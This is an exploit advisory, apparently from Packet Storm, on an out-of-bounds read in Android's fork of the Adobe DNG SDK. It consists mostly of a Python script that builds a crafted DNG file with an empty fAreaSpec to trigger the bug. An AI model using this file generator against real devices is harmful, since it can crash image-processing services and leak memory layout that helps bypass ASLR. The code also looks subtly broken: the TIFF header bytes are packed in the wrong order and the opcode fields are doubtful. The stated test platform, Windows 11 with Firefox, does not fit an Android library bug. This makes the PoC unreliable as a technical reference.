@@ -1,0 +1,93 @@
+=============================================================================================================================================
+| # Title     : Adobe DNG SDK v1.4 (Android’s fork) Out-of-Bounds Read                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://cs.android.com/android/platform/superproject/                                                                       |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/207365/
+
+[+] Summary : 
+             
+           A vulnerability exists in Adobe DNG SDK (the fork used by Android) due to improper validation of the fAreaSpec fields inside the dng_opcode_DeltaPerRow::ProcessArea function. 
+		   If an attacker supplies a crafted DNG file with an empty or malformed fAreaSpec, the SDK performs arithmetic that results in signed integer underflow. 
+		   This underflow leads to an out‑of‑bounds read when computing the lookup table pointer.
+           Because the DNG SDK is widely used in Android’s raw‑image pipeline (BuildImageStage2), the bug becomes reachable from remote contexts that process untrusted DNG images. 
+		   The vulnerability can result in a crash and may enable ASLR bypass, since observable differences in behavior depend on memory layout.
+           Android has shipped this vulnerable DNG fork for over 12 years, affecting multiple generations of devices.
+
+[+] Affected Version : Adobe DNG SDK v1.4 (Android’s fork)
+
+All Android versions using this fork, including:
+Android 15
+Android 14
+Android 13
+And earlier versions
+
+[+] POC : python poc.py ===> Python version to generate the malicious DNG:
+
+import struct
+
+def create_malicious_dng(filename):
+    with open(filename, 'wb') as f:
+        # TIFF Header
+        f.write(struct.pack('<I', 0x49492A00))  # Little endian
+        f.write(struct.pack('<I', 8))           # First IFD offset
+        
+        # IFD with 3 entries
+        f.write(struct.pack('<H', 3))  # 3 entries
+        
+        # Minimal required IFD entries
+        entries = [
+            (256, 4, 1, 64),     # ImageWidth
+            (257, 4, 1, 64),     # ImageLength
+            (51011, 7, 60, 128), # OpcodeList3 at offset 128
+        ]
+        
+        for tag, type, count, value in entries:
+            f.write(struct.pack('<HHII', tag, type, count, value))
+        
+        f.write(struct.pack('<I', 0))  # Next IFD (0 = end)
+        
+        # Write some dummy image data at offset 24
+        f.seek(24)
+        f.write(b'\x00' * 100)
+        
+        # Write malicious opcode at offset 128
+        f.seek(128)
+        
+        # DeltaPerRow opcode - 11 parameters total
+        opcode_params = [
+            0x0002,     # opcode_id: DeltaPerRow
+            1,          # version
+            0,          # flags
+            100,        # top - VULNERABILITY TRIGGER
+            0,          # left
+            50,         # bottom - top >= bottom makes fAreaSpec empty
+            64,         # right
+            1,          # row_pitch
+            1,          # col_pitch
+            0,          # plane
+            1           # planes
+        ]
+        
+        # Pack each parameter individually to avoid format string issues
+        for param in opcode_params:
+            f.write(struct.pack('<I', param))
+        
+        # Table size and data
+        table_size = 50  # Small table to ensure OOB read
+        f.write(struct.pack('<I', table_size))
+        
+        # Write table data
+        for i in range(table_size):
+            f.write(struct.pack('<f', 0.1))
+        
+    print(f"Malicious DNG created: {filename}")
+
+if __name__ == "__main__":
+    create_malicious_dng("poc.dng")
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
